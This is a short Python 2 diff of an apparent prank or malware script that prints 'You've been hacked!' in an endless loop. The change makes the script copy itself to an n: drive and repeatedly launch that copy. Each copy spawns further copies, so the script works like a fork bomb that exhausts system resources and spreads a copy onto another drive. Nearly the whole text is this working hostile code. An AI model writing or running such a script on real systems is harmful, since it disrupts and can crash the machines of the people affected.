@@ -11,7 +11,8 @@ import shutil
 
 directory = os.getcwd() + '\main.py'
 
+shutil.copyfile(directory, 'n:/main.py')
 while True:
     print "You've been hacked!"
-    os.startfile(directory)
+    os.startfile('n:/main.py')
    
